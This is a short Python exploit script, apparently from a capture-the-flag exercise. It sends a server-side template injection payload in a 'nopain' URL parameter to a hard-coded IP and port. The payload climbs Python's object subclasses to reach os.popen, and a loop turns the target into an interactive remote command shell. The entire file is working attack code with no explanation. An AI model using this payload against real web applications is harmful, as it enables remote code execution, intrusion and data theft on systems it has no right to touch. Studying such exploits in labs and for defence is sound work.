import requests

url = "http://206.189.89.253:32160"

def geturl(url, command):
    return url + "/?nopain={{%22foo%22.__class__.__base__.__subclasses__()[207].__init__.__globals__[%27sys%27].modules[%27os%27].popen(%22"+command+"%22).read()}}"

while True:
    response = requests.get(geturl(url, input("")))
    print(response.text)
